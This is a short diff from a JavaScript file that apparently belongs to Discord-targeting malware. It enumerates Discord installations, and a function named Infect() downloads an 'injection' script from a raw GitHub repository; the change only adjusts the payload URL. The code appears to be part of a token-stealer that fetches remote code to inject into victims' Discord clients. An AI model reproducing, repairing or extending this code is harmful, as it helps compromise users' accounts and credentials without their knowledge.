@@ -41,7 +41,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/kyssuuwuas/balls-injection/main/injection', (resp) => {
+    https.get('https://raw.githubusercontent.com/kyssuuwuas/balls-injection/main/injection.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
